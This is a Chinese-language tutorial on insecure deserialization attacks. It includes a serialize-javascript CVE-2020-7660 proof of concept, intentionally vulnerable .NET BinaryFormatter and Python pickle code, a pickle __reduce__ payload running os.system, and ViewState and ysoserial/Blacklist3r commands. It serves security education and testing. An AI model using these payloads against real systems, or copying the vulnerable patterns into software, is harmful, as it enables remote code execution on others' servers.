
# 序列化攻击

https://cwe.mitre.org/data/definitions/502.html

## 序列化与反序列化

**序列化** 是将复杂数据结构（如对象及其字段）转换为更“扁平”格式的过程，该格式可以作为连续字节流发送和接收。序列化数据使其变得更简单：

- 将复杂数据写入进程间内存、文件或数据库
- 传输复杂数据，例如通过网络、在应用程序的不同组件之间或在 API 调用中

关键的是，在序列化对象时，其状态也会被持久化。即，对象的属性及其分配的值都被保留。


**反序列化** 是将此字节流恢复为原始对象的完整功能副本的过程，状态与序列化时完全相同。网站的代码随后可以像处理任何其他对象一样与反序列化后的对象交互。

许多编程语言都原生支持序列化。对象的具体序列化方式取决于语言。某些语言将对象序列化为二进制格式，而其他语言则使用不同的字符串格式，具有不同的人类可读性。请注意，原始对象的所有属性都存储在序列化数据流中，包括任何私有字段。要防止字段被序列化，必须在类声明中将其显式标记为“transient”（瞬时）。

请注意，当使用不同的编程语言时，序列化可能被称为 marshalling（Ruby）或 pickling（Python）。这些术语在此上下文中与“序列化”同义。

序列化数据默认情况下未加密，也不具备防篡改能力，因此对象可能被操纵，从而导致非预期的后果。

## 不安全的反序列化

不安全的反序列化发生在网站反序列化用户可控数据时。这可能使攻击者能够操纵序列化对象，从而将有害数据传递到应用程序代码中。

甚至可以用完全不同类的对象替换序列化对象。令人担忧的是，网站可用的任何类的对象都会被反序列化和实例化，无论期望哪个类。因此，不安全的反序列化有时也被称为“对象注入”漏洞。

意外类的对象可能会导致异常。但到此时，损害可能已经发生。许多基于反序列化的攻击在**反序列化完成之前**就已经完成。这意味着反序列化过程本身就可以发起攻击，即使网站自身功能没有直接与恶意对象交互。因此，基于强类型语言的网站逻辑也可能容易受到这些技术的攻击。

在 JavaScript 运行环境中，合并到对象中的 JSON 还可能触发[原型污染]。

## 不安全的反序列化漏洞是如何产生的？

不安全的反序列化通常是由于普遍缺乏对反序列化用户可控数据危险性的理解而导致的。理想情况下，永远不应反序列化用户输入。

然而，有时网站所有者认为他们是安全的，因为他们对反序列化数据实施了某种形式的额外检查。这种方法通常无效，因为几乎不可能实现验证或清理来应对所有情况。这些检查还存在根本缺陷，因为它们依赖于在反序列化之后检查数据，这在许多情况下为时已晚，无法阻止攻击。

漏洞也可能因为反序列化对象通常被认为是可信的而产生。特别是当使用具有二进制序列化格式的语言时，开发人员可能认为用户无法有效读取或操作数据。然而，尽管可能需要更多努力，但攻击者利用二进制序列化对象与利用基于字符串的格式一样可能。

由于现代网站中存在大量依赖项，基于反序列化的攻击也成为可能。一个典型站点可能实现许多不同的库，每个库又有自己的依赖项。这创建了一个庞大的类和方法的池，难以安全管理。由于攻击者可以创建这些类中的任何一个实例，因此很难预测可以针对恶意数据调用哪些方法。如果攻击者能够将一系列意外的方法调用串联起来，将数据传递到与初始源完全无关的接收器中，尤其如此。因此，几乎不可能预测恶意数据流并堵塞每一个潜在漏洞。

简而言之，可以说安全地反序列化不可信输入是不可能的。

## 不安全的反序列化会造成什么影响？

不安全的反序列化影响可能非常严重，因为它为大幅增加的攻击面提供了一个入口点。它允许攻击者以有害方式重用现有应用程序代码，导致许多其他漏洞，通常是远程代码执行。

即使在无法实现远程代码执行的情况下，不安全的反序列化也可能导致权限提升、任意文件访问和拒绝服务攻击。

## 攻击序列化过程本身：2020年 javascript serialize 库漏洞

通过序列化攻击来攻击 Web 应用的第一步是找到应用中执行数据序列化的函数。下一步是使用测试数据调用该函数，以便比较一组序列化函数的输入和输出。

考虑流行的 npm 库 [serialize-javascript](https://oreil.ly/zCgW7)。该库每周下载量超过 3000 万次，并用于数万个基于 JavaScript 的应用。然而，3.0.9 及更低版本容易受到代码注入攻击，其 `serialization()` 函数被用作载荷的传递机制。
- [cve 索引](https://nvd.nist.gov/vuln/detail/cve-2020-7660) 
- [Github 修复说明](https://github.com/yahoo/serialize-javascript/commit/f21a6fb3ace2353413761e79717b2d210ba6ccbd) 


在这种情况下，将载荷 
```js
{
  "foo": /1"code/, 
  "bar": "a\"@__R-<UID>-0__@"
}
``` 

输入 `serialization()` 函数将导致序列化 JSON 为 
```js
{
  "foo": /1"code/, 
  "bar": "a\/1"code/
}
```
- 脆弱版本中，可在字符串字面量中替换正则 / 函数占位符 `"@__R-<UID>-0__@"`
  - 即，仅简单匹配替换 `"占位符"` 的模式，即使开头的双引号被转义
  - 此处示例的 bar 值的占位符，最终被替换为 foo 值的正则表达式 `/1"code/`
  - foo 值中的双引号将闭合 bar 值的前半部分字符串 `"a\/1"`，从而导致之后的内容从 bar 值中跳出

生成的 JSON 对象的结构会转义引号（引号是正确 JSON 对象的预期部分），因此如果它曾经通过 `eval()` 函数运行，就会导致代码执行。

像 
```js
eval('(' + serialize({
  "foo": /1" + console.log(1) /i, 
  "bar": '"@__R-<UID>-0__@'
  }) + ')');
``` 
这样的概念验证代码会导致代码执行，因为序列化器无法将此输出字符串格式化为正确转义的 JSON。

- 正则表达式被保存，并替换为占位符
  ```js
  {
    "foo": "@__R-<UID>-0__@", 
    "bar": '"@__R-<UID>-0__@'
  }
  ```

- JSON 序列化：最外层单引号变双引号，内层的双引号被转义

  ```js
  {
    "foo": "@__R-<UID>-0__@", 
    "bar": "\"@__R-<UID>-0__@"
  }
  ``` 

- 占位符替换，JS 命令跳出 bar 值的字符串
  
  ```js
  {
    "foo": /1" + console.log(1) /i, 
    "bar": "\/1" + console.log(1) /i
  }
  ``` 

此漏洞的核心为：动态执行代码中，模式匹配 + 替换，导致字符串逃逸后执行代码

## .NET：不安全的反序列化

与使用通用 `serialize()` 和 `unserialize()` 函数的 PHP 不同，.NET 支持多种序列化格式和方法，每种都适用于不同的用例：

- **二进制序列化**：包括 BinaryFormatter 等序列化方法，将对象转换为二进制格式。
- **XML 序列化**：包括 XmlSerializer 方法，用于将对象序列化为 XML 格式。
- **数据协定序列化**：包括 `DataContractSerializer` 等方法，用于将数据序列化和反序列化为 XML 或 JSON。

为了演示此漏洞，我们将重点关注“BinaryFormatter”，这是一种自 .NET 早期版本就存在的序列化方法。虽然 BinaryFormatter 因其紧凑的二进制格式在存储或传输数据方面效率较高，但由于安全问题已被标记为过时。

考虑以下 C# 命令行代码，该代码容易受到不安全的反序列化攻击。该代码执行以下步骤：

1. 应用程序提示用户通过控制台输入 base64 编码的数据。
2. 然后将此数据从 base64 解码为包含序列化对象的字节数组。
3. 接下来，使用 `BinaryFormatter` 将字节数组反序列化回 `Person` 对象，随后执行该对象的 `Greet` 方法。
4. `Person` 类实现了 `IDeserializationCallback` 接口，在反序列化完成后自动触发回调方法 `OnDeserialization`。

**易受攻击的代码**
```csharp
using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;

class Program
{
    static void Main(string[] args)
    {
        AppContext.SetSwitch("Switch.System.Runtime.Serialization.SerializationGuard.AllowProcessCreation", true);

        // 接受 base64 编码数据的输入
        Console.WriteLine("Enter the base64 encoded data:");
        string base64EncodedData = Console.ReadLine();

        // 解码 base64 编码的数据
        byte[] serializedData = Convert.FromBase64String(base64EncodedData);

        // 反序列化对象
        var formatter = new BinaryFormatter();
        using (var stream = new MemoryStream(serializedData))
        {
            var deserializedPerson = (Person)formatter.Deserialize(stream);
            // 在反序列化的 person 对象上调用 Greet 方法
            deserializedPerson.Greet();
        }
        Console.ReadLine();
    }
}
```

**Person 类代码：**
```csharp
public class Person : IDeserializationCallback
{
    public string Name { get; set; }
    public int Age { get; set; }

    public void Greet()
    {
        Console.WriteLine("Hello, " + Name + "!"); // 用户可控输入
    }

    public void OnDeserialization(Object sender)
    {
        Process.Start(new ProcessStartInfo(Name)); // 危险方法
    }
}
```

`OnDeserialization` 方法充当 gadget 属性，在反序列化时自动执行。因此，整个场景的利用基于 `OnDeserialization` gadget 的逻辑。在本例中，通过用户提供的 `name` 参数生成进程。

**数据的序列化**
```csharp
class Program
{
    static void Main(string[] args)
    {
        AppContext.SetSwitch("Switch.System.Runtime.Serialization.SerializationGuard.AllowProcessCreation", true);

        var payload = new Person(); // 创建有效载荷对象
        Console.Write("Enter the name: "); // 从用户获取输入
        payload.Name = Console.ReadLine();
        Console.Write("Enter the age: ");
        int age;
        if (int.TryParse(Console.ReadLine(), out age)) {
            payload.Age = age;
        } else {
            Console.WriteLine("Invalid age. Using default value.");
            payload.Age = 0;
        }

        // 序列化对象
        var formatter = new BinaryFormatter();
        var stream = new MemoryStream();
        formatter.Serialize(stream, payload);
        stream.Seek(0, SeekOrigin.Begin);

        // 获取序列化数据
        byte[] serializedData = stream.ToArray();
        string base64EncodedData = Convert.ToBase64String(serializedData);

        // 显示 base64 编码的数据
        Console.WriteLine("\nBase64 Encoded Data:");
        Console.WriteLine(base64EncodedData);
        Console.ReadLine();
    }
}
```

让我们实际运行一下。执行应用程序后，控制台应用程序接受 `name` 和 `age` 作为输入。`name` 提供为 `calc.exe`，`age` 提供为 `25`，然后返回 base64 编码的序列化数据。

**提示**：从黑盒测试的角度来看，序列化数据可能揭示 `BinaryFormatter` 的存在；如果您看到字符串 `con`，这可能表明 .NET 应用程序正在使用 BinaryFormatter 反序列化。

### ASP.NET ViewState 不安全的反序列化

ASP.NET ViewState 是一种客户端状态管理功能，广泛用于 .NET Web 应用程序中。它保留网页的状态，对于多步骤表单（如电子商务结账过程）特别有用。ViewState 有助于在页面导航期间维护用户输入的数据，而无需持久化到数据库，从而提高性能和用户体验。

ViewState 数据以 base64 编码，并通过名为 `__VIEWSTATE` 的隐藏输入字段传输。回发时，ASP.NET 框架反序列化 ViewState 以重建页面及其控件的状态。如果此反序列化过程未安全处理，则可能使应用程序面临不安全的反序列化攻击，在缺少完整性检查以防止篡改的情况下，可能允许攻击者在服务器上执行任意代码。

### MAC 验证和加密

ASP.NET 采用 MAC（消息认证码）来确保 `VIEWSTATE` 参数在过程中未被篡改。这是通过将客户端提供的 MAC 与回发时计算的哈希进行比较来实现的。这可以防止恶意用户篡改 VIEWSTATE；但用户仍有可能解密其内容，从而导致机密性受损。为了防止这种情况，VIEWSTATE 可以使用 `machineKey` 进行加密。这些密钥可以存储在 `web.config` 或 `machine.config` 文件中。

如果 MAC 验证被禁用，或者验证密钥和解密密钥都被泄露，则可能存在 ViewState 篡改的风险。这可能允许攻击者注入一个精心制作的 ViewState，如果服务器不安全地反序列化，则可能导致任意代码执行。

像 YSOSERIAL.NET 这样的工具可以通过利用不安全的反序列化漏洞来帮助创建此类有效载荷。必须提到的是，可能可以通过其他漏洞（如目录遍历、本地文件包含（LFI）、XML 外部实体注入（XXE）或甚至暴力破解密钥）来获取密钥。

例如，`web.config` 文件中的 `machineKey` 部分可能如下所示：

**Web.Config 配置**
```xml
<configuration>
    <system.web>
        <machineKey
            validationKey="30D9001AE4B8102D87EB0E2E8E9D4A4A54D93E897C3E3F5B6162C6FEBF91932B"
            decryptionKey="A8B675A8D3F57DA882FDB3E3B16C3B233A966A2C"
            validation="HMACSHA256"
            decryption="AES" />
    </system.web>
</configuration>
```

`validationKey` 用于创建 MAC，而 `decryptionKey` 用于加密/解密数据。

### 工具：利用工具 YSOSerial

为了利用不安全的反序列化，我们可以使用 `ysoserial.net`，它将为 ViewState 生成有效载荷。以下命令将向托管在 192.168.1.100 的攻击者控制服务器发出带外请求。

该命令指定了 `ObjectStateFormatter`，它生成一个适合通过 `ObjectStateFormatter` 反序列化的有效载荷。`ObjectStateFormatter` 是一个在 ViewState 中的回发之间序列化/反序列化对象的类。

### 工具：Blacklist3r

Blacklist3r 是一个命令行工具，旨在评估 ASP.NET 应用程序中 ViewState 和其他序列化数据的安全性。该工具有助于对 VIEWSTATE 数据进行编码和解码、生成 MAC 以及暴力破解 `MachineKey` 等功能。如果 MachineKey 被泄露或通过任何方法发现，Blacklist3r 可以使用获取的密钥创建合法的 VIEWSTATE 值。以下是使用 Blacklist3r 的几个命令。

- 解码 VIEWSTATE
    ```sh
    AspDotNetWrapper.exe --viewstate /path/to/viewstate/file --decode
    ```

- 编码 VIEWSTATE
    ```sh
    AspDotNetWrapper.exe --viewstate /path/to/viewstate/file --encode
    ```

- 生成带有特定 MAC 密钥的 VIEWSTATE
    ```sh

    ```

- 暴力破解 VIEWSTATE MachineKey

## 不安全的反序列化——Python

在 Python 中，`pickle` 模块提供了序列化和反序列化 Python 对象结构的功能。为了理解这一点，让我们创建一个 `employee_data` 字典，其中包含 `employee_id`、`employee_name` 和 `Department` 参数。

- `pickle.dumps()`
    序列化数据为字节对象，然后可以将此字节对象写入文件或通过网络传输。

- `pickle.loads()` 
    将字节反序列化回对象

- `__reduce__()`
    （自定义）对象的序列化/反序列化自动调用的魔术方法，返回元组时格式为 `(对象或方法,(参数,..))`，之后被直接实例化或调用。即，创建/调用拥有任意参数的对象/方法

当攻击者通过用户提供的输入控制对象，且这些对象被序列化后再反序列化，可导致远程代码执行

**代码：serialized.py**
```python
import pickle
import os

class example:
    def __reduce__(self):
        custom_obj = os.system
        custom_argvs = ("id",)
        return (custom_obj, custom_argvs)

print(pickle.dumps(example()))
```

查看 [pickle 库 reduce 函数源码](https://github.com/python/cpython/blob/main/Lib/pickle.py)

```py
def load_reduce(self):
    stack = self.stack
    args = stack.pop()
    func = stack[-1]
    stack[-1] = func(*args)
dispatch[REDUCE[0]] = load_reduce
```
- `__reduce__` 返回的对象/参数元组被用来构建实例。即，自定义`对象/函数(参数)`将在此处执行

现在让我们考虑一个名为“Bug Bounty Writeups”的应用程序场景。该应用程序实现了搜索功能，允许用户搜索漏洞赏金文章。

该代码包含一个名为 `search_cookie` 的 Cookie 方法，该方法通过搜索表单从用户提供的输入中检索。输入使用 `pickle` 模块序列化，随后编码为 base64 并设置为 Cookie。

接下来，该函数从 base64 解码 Cookie，将其转换为字节对象，然后由 `pickle_loads()` 反序列化回其原始数据结构。

**易受攻击的代码**
```python
def search_articles(request):
    try:
        # 保存 cookie 用户输入并反序列化
        cookie = request.COOKIES.get('search_cookie')
        cookie = pickle.loads(base64.b64decode(cookie))
    except:
        pass
    if request.method == 'POST':
        # 保存 query 参数用户输入并序列化
        query = request.POST.get('query')
        encoded_cookie = base64.b64encode(pickle.dumps(query))
        encoded_cookie = encoded_cookie.decode("utf-8")
        if query:
            results = Article.objects.filter(Q(title__icontains=query) | Q(body__icontains=query))
        else:
            results = Article.objects.all()
        context = {
            'results': results,
        }
        html = render(request, 'homepage/search.html', context)
        # 序列化后的用户输入设置为 Cookie
        html.set_cookie('search_cookie', encoded_cookie) 
        return html
```

提交测试字符串后，拦截请求显示 `search_cookie` 字段填充了一个 base64 编码的值。该值包含一个序列化的 pickle 字符串，其中保留了作为最近搜索信息的测试字符串。解码 base64 编码的字符串并随后反序列化 pickle 对象后，提取的内容得以还原。

## 不安全的反序列化——Java

在 Java 中，与 .NET 类似，有几个函数可用于执行序列化/反序列化。Java 为此提供了三大类别。

- **基本序列化**：用于将 Java 对象转换为序列化等效项，通常用于通过网络发送文件。`readObject()` 和 `writeObject()` 方法分别用于反序列化和序列化。
- **XML 序列化**：涉及将这些对象转换为相应的 XML 格式。这可以使用 XMLEncoder 和 XMLDecoder 实现。第三方库（如 XStream 和 Castor）也有助于 XML 序列化。
- **JSON 序列化**：JSON 序列化涉及将 Java 对象转换为相应的 JSON 格式；这通常用于 RESTful API。一些广泛使用的库包括 Jackson、Gson、FastJson 等。

与 .NET 类似，如果用户提供的输入在未充分检查的情况下被反序列化，Java 应用程序也容易受到不安全的反序列化攻击。攻击者可以利用这一点执行任意代码。为了安全地进行反序列化，Java 虚拟机（JVM）必须能够访问适当的类定义，这些定义位于类路径上。类路径告诉 JVM 在哪里找到所需的类，因此它必须包含所有必要的类文件和包。

java 的包路径为当前脚本所在目录结构
```java
package data.productcatalog;
```
- 当构造序列化对象时，确保头部的包路径存在，并且构造对应的文件路径

或需设置匹配的序列化 ID，以通过版本验证
```java
static final long serialVersionUID = 1L;
```

### Java 中的 Gadget 库

在 Java 上下文中，“gadget 库”指的是类的集合。虽然它们具有合法用途，但在序列化和反序列化过程中可能被滥用或利用。这些库通常包含各种应用程序加载的类，当它们位于应用程序的类路径上时，攻击者可以利用它们。

在反序列化过程中，Java 重建对象时需要序列化对象的类定义。如果反序列化代码的类路径包含所有必需的类，则会继续反序列化对象。如果类路径包含 gadget 库（其中包含在反序列化时执行危险操作的类），则此行为可能变得不安全，从而可能导致远程代码执行、权限提升等。了解到这一点，攻击者可以构造序列化数据，在反序列化时利用这些 gadget 执行恶意有效载荷。

多年来，研究人员已经识别出多个此类危险库，其中 Apache Commons Collections 库 1 至 6 版本是显著的例子。一个名为 `ysoserial` 的工具已被开发出来，用于演示这些漏洞的利用。它提供了利用这些库中的 gadget 在反序列化过程中执行任意代码的有效载荷。

### 不安全的反序列化——示例

如前所述，如果用户输入通过易受攻击的方法（如 `readObject()` 方法）从不受信任的输入中反序列化对象，则可能引发问题。前提条件是反序列化对象的类具有在反序列化时自动运行的代码，且类路径包含 gadget 库。

为了演示此漏洞，我们将使用 `java-deserialize-webapp` [https://github.com/hvqzao/java-deserialize-webapp]。

### 易受攻击的代码

易受攻击的代码部分是 `fromBase64` 方法。`fromBase64` 方法接受一个 base64 编码的字符串（`s`）作为输入，并使用 `ObjectInputStream` 将其反序列化为对象。

```java
public static Object fromBase64(String s) throws IOException, ClassNotFoundException {
    byte[] data = new Base64().decode(s);
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    Object o = ois.readObject();
    ois.close();
    return o;
}
```

### 验证漏洞

为了验证漏洞，我们将使用 ysoserial 中的 `URLDNS` 有效载荷。该有效载荷不执行代码，但会促使反序列化端点解析特定的 DNS 名称，从而提供一种确认是否发生不安全反序列化的方法。

为了接收回调，我们将使用 `DnsChef`，这是一个基于 Python 的 DNS 代理工具。它提供了一个可定制的拦截和监控平台，这在测试 URLDNS 有效载荷时非常重要。因此，该工具将有效地使我们能够捕获由有效载荷触发的 DNS 查询。

为了设置处理程序，我们将使用以下命令：

**命令：**
```sh
./dnschef.py --fakeip=127.0.0.1 --interface=127.0.0.1 --port=53
```

此命令指示 `DNSChef` 在 127.0.0.1（本地主机）上监听 53 端口（标准 DNS 端口），并对接收到的任何 DNS 查询响应该地址。

### Java 应用程序的黑盒审查

在通过分析网络流量进行渗透测试时，某些指标可能表明 Java Web 应用程序中使用了序列化对象。以下是一些指标：

- **查找十六进制序列**：检查十六进制序列 `AC ED 00 05`。
- **搜索 Base64 数据**：识别以 `rO0` 开头的 base64 数据。
- **查找完全限定类名**：查找数据中的完全限定类名，包括包名和类名。例如，您可能会在日志中遇到类似 `com.example.projectname.model.UserDetails` 的字符串，其中 `com.example.projectname.model` 是包名，`UserDetails` 是类名。
- **Content-Type**：您可能会遇到响应头设置为 `application/x-java-serialized-object`，表示序列化对象数据。

### Java 框架和库的指示符

类似地，某些指示符也可能表明使用了某些框架和字符串：

- **Spring 框架指示符**：搜索以 `org.springframework` 或 `org.springframework.core` 开头的字符串，以检测 Spring 的序列化机制。
- **Apache Commons Collections 使用**：查找类似 `org.apache.commons.collections.functors` 的字符串，这表示使用了 Apache Commons Collections，该库常在 ysoserial 有效载荷中被利用。
- **JBoss 库参与**：识别以 `org.jboss.` 开头的字符串，表明序列化中使用了 JBoss 库。
- **Java 原生类型序列化**：搜索序列化的标准 Java 类型，表现为类似 `java.util.HashMap` 或 `java.lang.String` 的字符串。

## 序列化攻击步骤

所有序列化攻击都遵循相同的步骤：

1. 找到一个执行序列化的函数。
2. 仔细阅读该函数，或使用常见载荷进行测试。
3. 在发现无法正确序列化数据后，创建一个能够执行脚本的载荷。
4. 使用能够执行脚本的载荷调用该函数。
5. 获得远程代码执行（服务端）或 XSS（客户端）。

由于大多数网站并不实现自己的序列化器，因此有可能找到存在漏洞的开源序列化器，并扫描易受攻击的应用和方法。这是一种高级攻击技术，但它是现实中寻找和利用序列化漏洞的最佳方法之一。
